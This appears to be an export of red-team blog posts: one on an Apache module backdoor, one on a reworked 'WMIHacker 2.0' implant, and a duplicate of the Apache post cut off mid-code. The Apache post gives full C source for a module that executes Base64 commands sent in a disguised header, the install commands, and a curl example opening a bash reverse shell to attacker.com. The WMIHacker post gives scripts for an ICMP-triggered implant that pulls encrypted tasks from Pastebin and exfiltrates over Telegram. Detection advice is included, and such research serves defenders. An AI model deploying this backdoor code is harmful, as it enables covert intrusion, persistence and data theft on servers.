[{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nIntroduction While studying APT and Red Team materials, I came across an excellent article from CICADA8 about establishing persistence in infrastructure through IIS modules instead of classic webshells.\nIn the Windows ecosystem, the typical approach involves writing a DLL and registering it as a service or system component to extend native APIs. This sparked an idea: what if we implemented a similar technique for Linux environments using Apache modules?\nI\u0026rsquo;m not the first to explore this vector. Researchers from ESET documented this technique back in 2012, but as they say, everything old is new again. Despite its potential, this technique remains relatively undocumented and underexplored in modern security literature. After some research, I discovered that Apache supports extending its functionality through modules (mods), which are primarily written in C.\nWhy Apache Modules Over Traditional Webshells? The advantages of this approach compared to conventional webshells are compelling:\nProcess-level execution: The module runs inside the web server process and doesn\u0026rsquo;t reside in the public webroot, making it significantly harder to discover through simple file enumeration URL-agnostic operation: Not tied to a specific endpoint, providing flexibility in backdoor logic implementation Stealth: Much harder to detect through standard Apache access logs since the malicious activity occurs at the module level Persistence: Survives webroot cleanups and application redeployments This article explores these attack vectors for research purposes and does not encourage malicious activity. Let\u0026rsquo;s dive into the technical implementation.\nModule Development To develop a functional Apache2 module backdoor, we first need to define our core requirements. For this Proof of Concept, I established the following functionality goals:\nTechnical Requirements Base64 encoding: Commands should be transmitted in Base64 format, and output should be returned encoded as well Global interception: The module should intercept all requests to the web application without being tied to a specific URL endpoint Header-based communication: The server receives commands via HTTP request headers and returns output to the client Minimal footprint: Avoid obvious indicators of compromise in standard logs Implementation Overview With our technical requirements formalized, we can proceed with the backdoor implementation. Full disclosure: I leveraged AI chatbots and LLMs to accelerate the development process.\nCore Imports #include \u0026#34;httpd.h\u0026#34; #include \u0026#34;http_config.h\u0026#34; #include \u0026#34;http_protocol.h\u0026#34; #include \u0026#34;ap_config.h\u0026#34; #include \u0026#34;http_request.h\u0026#34; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; These headers provide the necessary Apache API functions and standard C libraries for our module.\nBase64 Decoder Implementation The decoder converts Base64-encoded commands received from the attacker into plaintext for execution:\nstatic unsigned char *b64decode(apr_pool_t *pool, const char *input, size_t *out_len) { size_t len = strlen(input); unsigned char *output = apr_pcalloc(pool, len); static const char b64_table[256] = { [\u0026#39;A\u0026#39;]=0, [\u0026#39;B\u0026#39;]=1, [\u0026#39;C\u0026#39;]=2, [\u0026#39;D\u0026#39;]=3, [\u0026#39;E\u0026#39;]=4, [\u0026#39;F\u0026#39;]=5, [\u0026#39;G\u0026#39;]=6, [\u0026#39;H\u0026#39;]=7, [\u0026#39;I\u0026#39;]=8, [\u0026#39;J\u0026#39;]=9, [\u0026#39;K\u0026#39;]=10, [\u0026#39;L\u0026#39;]=11, [\u0026#39;M\u0026#39;]=12, [\u0026#39;N\u0026#39;]=13, [\u0026#39;O\u0026#39;]=14, [\u0026#39;P\u0026#39;]=15, [\u0026#39;Q\u0026#39;]=16, [\u0026#39;R\u0026#39;]=17, [\u0026#39;S\u0026#39;]=18, [\u0026#39;T\u0026#39;]=19, [\u0026#39;U\u0026#39;]=20, [\u0026#39;V\u0026#39;]=21, [\u0026#39;W\u0026#39;]=22, [\u0026#39;X\u0026#39;]=23, [\u0026#39;Y\u0026#39;]=24, [\u0026#39;Z\u0026#39;]=25, [\u0026#39;a\u0026#39;]=26, [\u0026#39;b\u0026#39;]=27, [\u0026#39;c\u0026#39;]=28, [\u0026#39;d\u0026#39;]=29, [\u0026#39;e\u0026#39;]=30, [\u0026#39;f\u0026#39;]=31, [\u0026#39;g\u0026#39;]=32, [\u0026#39;h\u0026#39;]=33, [\u0026#39;i\u0026#39;]=34, [\u0026#39;j\u0026#39;]=35, [\u0026#39;k\u0026#39;]=36, [\u0026#39;l\u0026#39;]=37, [\u0026#39;m\u0026#39;]=38, [\u0026#39;n\u0026#39;]=39, [\u0026#39;o\u0026#39;]=40, [\u0026#39;p\u0026#39;]=41, [\u0026#39;q\u0026#39;]=42, [\u0026#39;r\u0026#39;]=43, [\u0026#39;s\u0026#39;]=44, [\u0026#39;t\u0026#39;]=45, [\u0026#39;u\u0026#39;]=46, [\u0026#39;v\u0026#39;]=47, [\u0026#39;w\u0026#39;]=48, [\u0026#39;x\u0026#39;]=49, [\u0026#39;y\u0026#39;]=50, [\u0026#39;z\u0026#39;]=51, [\u0026#39;0\u0026#39;]=52, [\u0026#39;1\u0026#39;]=53, [\u0026#39;2\u0026#39;]=54, [\u0026#39;3\u0026#39;]=55, [\u0026#39;4\u0026#39;]=56, [\u0026#39;5\u0026#39;]=57, [\u0026#39;6\u0026#39;]=58, [\u0026#39;7\u0026#39;]=59, [\u0026#39;8\u0026#39;]=60, [\u0026#39;9\u0026#39;]=61, [\u0026#39;+\u0026#39;]=62, [\u0026#39;/\u0026#39;]=63 }; size_t i = 0, j = 0; uint32_t buf = 0; int bits = 0; while (i \u0026lt; len) { char c = input[i++]; if (c == \u0026#39;=\u0026#39; || c == \u0026#39;\\0\u0026#39;) break; if ((unsigned char)c \u0026gt; 127 || (b64_table[(unsigned char)c] == 0 \u0026amp;\u0026amp; c != \u0026#39;A\u0026#39;)) continue; buf = (buf \u0026lt;\u0026lt; 6) | b64_table[(unsigned char)c]; bits += 6; if (bits \u0026gt;= 8) { bits -= 8; output[j++] = (buf \u0026gt;\u0026gt; bits) \u0026amp; 0xFF; } } if (out_len) *out_len = j; return output; } Base64 Encoder Implementation The encoder converts command output back to Base64 for transmission to the attacker:\nstatic char *b64encode(apr_pool_t *pool, const unsigned char *input, size_t len) { static const char b64_chars[] = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; size_t out_len = 4 * ((len + 2) / 3); char *output = apr_pcalloc(pool, out_len + 1); size_t i = 0, j = 0; while (i \u0026lt; len) { uint32_t octet_a = i \u0026lt; len ? input[i++] : 0; uint32_t octet_b = i \u0026lt; len ? input[i++] : 0; uint32_t octet_c = i \u0026lt; len ? input[i++] : 0; uint32_t triple = (octet_a \u0026lt;\u0026lt; 16) | (octet_b \u0026lt;\u0026lt; 8) | octet_c; output[j++] = b64_chars[(triple \u0026gt;\u0026gt; 18) \u0026amp; 0x3F]; output[j++] = b64_chars[(triple \u0026gt;\u0026gt; 12) \u0026amp; 0x3F]; output[j++] = (i \u0026gt; len + 1) ? \u0026#39;=\u0026#39; : b64_chars[(triple \u0026gt;\u0026gt; 6) \u0026amp; 0x3F]; output[j++] = (i \u0026gt; len) ? \u0026#39;=\u0026#39; : b64_chars[triple \u0026amp; 0x3F]; } output[out_len] = \u0026#39;\\0\u0026#39;; return output; } Request Hook Handler This is the core logic that intercepts HTTP requests, extracts commands, executes them, and returns the output:\nstatic int admin_exec_hook(request_rec *r) { // Skip subrequests if (r-\u0026gt;main) return DECLINED; // Check for our trigger header const char *hdr_enc = apr_table_get(r-\u0026gt;headers_in, \u0026#34;X-Request-ID\u0026#34;); if (!hdr_enc) return DECLINED; // Decode the command size_t cmd_len; unsigned char *cmd = b64decode(r-\u0026gt;pool, hdr_enc, \u0026amp;cmd_len); if (!cmd || cmd_len == 0) return DECLINED; ap_set_content_type(r, \u0026#34;text/plain\u0026#34;); // Execute command via popen FILE *fp = popen((const char *)cmd, \u0026#34;r\u0026#34;); if (!fp) { ap_rputs(\u0026#34;failed\\n\u0026#34;, r); return OK; } // Capture command output char buffer[8192]; size_t total_len = 0; size_t cap = 8192; unsigned char *output = apr_pcalloc(r-\u0026gt;pool, cap); while (fgets(buffer, sizeof(buffer), fp)) { size_t blen = strlen(buffer); if (total_len + blen \u0026gt;= cap) { cap *= 2; unsigned char *newbuf = apr_palloc(r-\u0026gt;pool, cap); memcpy(newbuf, output, total_len); output = newbuf; } memcpy(output + total_len, buffer, blen); total_len += blen; } pclose(fp); // Encode and return output char *encoded = b64encode(r-\u0026gt;pool, output, total_len); ap_rputs(encoded, r); return OK; } Module Registration Finally, we register our hook with Apache:\nstatic void register_hooks(apr_pool_t *p) { ap_hook_header_parser(admin_exec_hook, NULL, NULL, APR_HOOK_MIDDLE); } module AP_MODULE_DECLARE_DATA admin_exec_module = { STANDARD20_MODULE_STUFF, NULL, NULL, NULL, NULL, NULL, register_hooks }; I called this whole project MODPlant, and deployed it in Github, you may download it here.\nProof of Concept Exploitation Prerequisites Installation First of all, install the Apache development tools required for module compilation:\nsudo apt update sudo apt install apache2-dev -y This installs the apxs (Apache Extension Tool) utility, which is essential for building and installing Apache modules.\nModule Compilation and Installation Compile and install the module with a single command:\nsudo apxs -i -a -c mod_shell.c This command performs three critical operations:\nCompilation: Converts our C source code into a .so (shared object) library Installation: Copies the compiled module to Apache\u0026rsquo;s module directory Configuration: Automatically adds a LoadModule directive to Apache\u0026rsquo;s configuration Service Restart After executing the apxs command, Apache needs to be restarted to load the new module:\nsudo systemctl restart apache2 Verify the service is running correctly:\nsudo systemctl status apache2 Testing the Backdoor Now we can interact with our backdoor. Commands are sent Base64-encoded via the X-Request-ID HTTP header. The header name can be modified in mod_shell.c to avoid detection.\nExample using curl:\n# Encode command: echo \u0026#34;whoami\u0026#34; | base64 # Result: d2hvYW1p curl -H \u0026#34;X-Request-ID: d2hvYW1p\u0026#34; http://target-server.com/ The server responds with Base64-encoded output: d3d3LWRhdGE=\nDecoding the Response Decode the server\u0026rsquo;s response to view command output:\necho \u0026#34;d3d3LWRhdGE=\u0026#34; | base64 -d # Output: www-data This demonstrates successful command execution with full output exfiltration. The Base64 encoding provides several benefits:\nObfuscates command content from casual log inspection Handles binary data and special characters safely Maintains compatibility with HTTP protocol requirements Advanced Usage Examples File enumeration:\n# Command: ls -la /etc/passwd echo \u0026#34;bHMgLWxhIC9ldGMvcGFzc3dk\u0026#34; | base64 curl -H \u0026#34;X-Request-ID: bHMgLWxhIC9ldGMvcGFzc3dk\u0026#34; http://target/ But, you also supposed to ensure the proper access for the user by which the apache service is running, in my case www-data default user does not have those excessive privileges, but it is also the vector for backdooring the target server.\nReverse shell establishment:\n# Command: bash -i \u0026gt;\u0026amp; /dev/tcp/attacker.com/4444 0\u0026gt;\u0026amp;1 echo \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx\u0026#34; | base64 curl -H \u0026#34;X-Request-ID: YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx\u0026#34; http://target/ Detection and Hunting Perspective Indicators of Attack (IOA) Defenders should monitor for the following suspicious activities:\n1. Suspicious apxs Execution The apxs tool is rarely used in production environments outside of initial server setup. Monitor process execution logs for:\n# Detection via Sysmon or auditd apxs -i -a -c *.c Detection logic:\nUnusual parent processes spawning apxs apxs execution by non-administrative users Compilation of .c files in unexpected directories (e.g., /tmp, /var/www) 2. Apache Service Restarts Unexpected Apache service restarts, especially outside maintenance windows:\nsystemctl restart apache2 service apache2 restart /etc/init.d/apache2 restart Monitoring points:\nCorrelate service restarts with user activity Alert on restarts without corresponding change tickets Track which user initiated the restart 3. File System Artifacts Monitor critical Apache directories for new or modified files:\nModule configuration:\n/etc/apache2/mods-available/*.load /etc/apache2/mods-enabled/*.load Compiled modules:\n/usr/lib/apache2/modules/*.so Detection strategy:\nBaseline legitimate modules during system provisioning Alert on new .so files with recent creation timestamps Check module file signatures against known-good hashes Inspect .load files for suspicious module names 4. Behavioral Anomalies Network indicators:\nUnusual outbound connections from Apache process HTTP requests with suspicious custom headers (e.g., X-Request-ID with long Base64 strings) Consistent Base64-encoded responses in HTTP traffic Conclusion Apache module-based backdoors represent a sophisticated persistence technique that combines stealth, flexibility, and resilience. By operating at the web server process level rather than as traditional webshells, these backdoors evade many common detection mechanisms.\nKey Takeaways For Red Teams:\nApache modules provide excellent persistence in authorized assessments The technique demonstrates the importance of defense-in-depth Custom headers and Base64 encoding add layers of obfuscation Consider operational security: module names, header names, and compilation artifacts all create detection opportunities For Blue Teams:\nTraditional webshell detection methods are insufficient against module-based backdoors File integrity monitoring and behavioral analysis are critical Baseline your environment to detect anomalous module installations Process execution monitoring can catch compilation activities Network traffic analysis can identify suspicious Base64-encoded communications Future Research Directions This technique can be extended further:\nMemory-only operation: Loading modules without disk persistence Encrypted communications: Replacing Base64 with AES encryption Polymorphic modules: Generating unique module signatures per deployment Multi-protocol support: Extending beyond HTTP to HTTPS, WebSockets, HTTP/2 Anti-forensics: Implementing self-deletion and log manipulation capabilities The arms race between attackers and defenders continues. Understanding these advanced persistence techniques is essential for both offensive security practitioners and defensive teams. As with all security research, use this knowledge responsibly and only in authorized contexts.\n","permalink":"http://localhost:1313/posts/apache-modules-persistence/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eDISCLAIMER:\u003c/strong\u003e\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"Article\" loading=\"lazy\" src=\"/apache-persistence-cover.png\"\u003e\u003c/p\u003e\n\u003cp\u003eWhile studying APT and Red Team materials, I came across an excellent article from \u003ca href=\"https://cicada-8.medium.com/from-http-to-rce-how-to-leave-backdoor-in-iis-cbef8249eba9\"\u003eCICADA8\u003c/a\u003e about establishing persistence in infrastructure through IIS modules instead of classic webshells.\u003c/p\u003e","title":"Persistent Backdoors via Apache Modules 🕷️"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWe’ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Micro’s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM — without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodes—other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the fewer artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previous section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasion—using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 – Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe – Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; – Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitre-attck-mapping\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 👾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nIntroduction While studying APT and Red Team materials, I came across an excellent article from CICADA8 about establishing persistence in infrastructure through IIS modules instead of classic webshells.\nIn the Windows ecosystem, the typical approach involves writing a DLL and registering it as a service or system component to extend native APIs. This sparked an idea: what if we implemented a similar technique for Linux environments using Apache modules?\nI\u0026rsquo;m not the first to explore this vector. Researchers from ESET documented this technique back in 2012, but as they say, everything old is new again. Despite its potential, this technique remains relatively undocumented and underexplored in modern security literature. After some research, I discovered that Apache supports extending its functionality through modules (mods), which are primarily written in C.\nWhy Apache Modules Over Traditional Webshells? The advantages of this approach compared to conventional webshells are compelling:\nProcess-level execution: The module runs inside the web server process and doesn\u0026rsquo;t reside in the public webroot, making it significantly harder to discover through simple file enumeration URL-agnostic operation: Not tied to a specific endpoint, providing flexibility in backdoor logic implementation Stealth: Much harder to detect through standard Apache access logs since the malicious activity occurs at the module level Persistence: Survives webroot cleanups and application redeployments This article explores these attack vectors for research purposes and does not encourage malicious activity. Let\u0026rsquo;s dive into the technical implementation.\nModule Development To develop a functional Apache2 module backdoor, we first need to define our core requirements. For this Proof of Concept, I established the following functionality goals:\nTechnical Requirements Base64 encoding: Commands should be transmitted in Base64 format, and output should be returned encoded as well Global interception: The module should intercept all requests to the web application without being tied to a specific URL endpoint Header-based communication: The server receives commands via HTTP request headers and returns output to the client Minimal footprint: Avoid obvious indicators of compromise in standard logs Implementation Overview With our technical requirements formalized, we can proceed with the backdoor implementation. Full disclosure: I leveraged AI chatbots and LLMs to accelerate the development process.\nCore Imports #include \u0026#34;httpd.h\u0026#34; #include \u0026#34;http_config.h\u0026#34; #include \u0026#34;http_protocol.h\u0026#34; #include \u0026#34;ap_config.h\u0026#34; #include \u0026#34;http_request.h\u0026#34; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; These headers provide the necessary Apache API functions and standard C libraries for our module.\nBase64 Decoder Implementation The decoder converts Base64-encoded commands received from the attacker into plaintext for execution:\nstatic unsigned char *b64decode(apr_pool_t *pool, const char *input, size_t *out_len) { size_t len = strlen(input); unsigned char *output = apr_pcalloc(pool, len); static const char b64_table[256] = { [\u0026#39;A\u0026#39;]=0, [\u0026#39;B\u0026#39;]=1, [\u0026#39;C\u0026#39;]=2, [\u0026#39;D\u0026#39;]=3, [\u0026#39;E\u0026#39;]=4, [\u0026#39;F\u0026#39;]=5, [\u0026#39;G\u0026#39;]=6, [\u0026#39;H\u0026#39;]=7, [\u0026#39;I\u0026#39;]=8, [\u0026#39;J\u0026#39;]=9, [\u0026#39;K\u0026#39;]=10, [\u0026#39;L\u0026#39;]=11, [\u0026#39;M\u0026#39;]=12, [\u0026#39;N\u0026#39;]=13, [\u0026#39;O\u0026#39;]=14, [\u0026#39;P\u0026#39;]=15, [\u0026#39;Q\u0026#39;]=16, [\u0026#39;R\u0026#39;]=17, [\u0026#39;S\u0026#39;]=18, [\u0026#39;T\u0026#39;]=19, [\u0026#39;U\u0026#39;]=20, [\u0026#39;V\u0026#39;]=21, [\u0026#39;W\u0026#39;]=22, [\u0026#39;X\u0026#39;]=23, [\u0026#39;Y\u0026#39;]=24, [\u0026#39;Z\u0026#39;]=25, [\u0026#39;a\u0026#39;]=26, [\u0026#39;b\u0026#39;]=27, [\u0026#39;c\u0026#39;]=28, [\u0026#39;d\u0026#39;]=29, [\u0026#39;e\u0026#39;]=30, [\u0026#39;f\u0026#39;]=31, [\u0026#39;g\u0026#39;]=32, [\u0026#39;h\u0026#39;]=33, [\u0026#39;i\u0026#39;]=34, [\u0026#39;j\u0026#39;]=35, [\u0026#39;k\u0026#39;]=36, [\u0026#39;l\u0026#39;]=37, [\u0026#39;m\u0026#39;]=38, [\u0026#39;n\u0026#39;]=39, [\u0026#39;o\u0026#39;]=40, [\u0026#39;p\u0026#39;]=41, [\u0026#39;q\u0026#39;]=42, [\u0026#39;r\u0026#39;]=43, [\u0026#39;s\u0026#39;]=44, [\u0026#39;t\u0026#39;]=45, [\u0026#39;u\u0026#39;]=46, [\u0026#39;v\u0026#39;]=47, [\u0026#39;w\u0026#39;]=48, [\u0026#39;x\u0026#39;]=49, [\u0026#39;y\u0026#39;]=50, [\u0026#39;z\u0026#39;]=51, [\u0026#39;0\u0026#39;]=52, [\u0026#39;1\u0026#39;]=53, [\u0026#39;2\u0026#39;]=54, [\u0026#39;3\u0026#39;]=55, [\u0026#39;4\u0026#39;]=56, [\u0026#39;5\u0026#39;]=57, [\u0026#39;6\u0026#39;]=58, [\u0026#39;7\u0026#39;]=59, [\u0026#39;8\u0026#39;]=60, [\u0026#39;9\u0026#39;]=61, [\u0026#39;+\u0026#39;]=62, [\u0026#39;/\u0026#39;]=63 }; size_t i = 0, j = 0; uint32_t buf = 0; int bits = 0; while (i \u0026lt; len) { char c = input[i++]; if (c == \u0026#39;=\u0026#39; || c == \u0026#39;\\0\u0026#39;) break; if ((unsigned char)c \u0026gt; 127 || (b64_table[(unsigned char)c] == 0 \u0026amp;\u0026amp; c != \u0026#39;A\u0026#39;)) continue; buf = (buf \u0026lt;\u0026lt; 6) | b64_table[(unsigned char)c]; bits += 6; if (bits \u0026gt;= 8) { bits -= 8; output[j++] = (buf \u0026gt;\u0026gt; bits) \u0026amp; 0xFF; } } if (out_len) *out_len = j; return output; } Base64 Encoder Implementation The encoder converts command output back to Base64 for transmission to the attacker:\nstatic char *b64encode(apr_pool_t *pool, const unsigned char *input, size_t len) { static const char b64_chars[] = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; size_t out_len = 4 * ((len + 2) / 3); char *output = apr_pcalloc(pool, out_len + 1); size_t i = 0, j = 0; while (i \u0026lt; len) { uint32_t 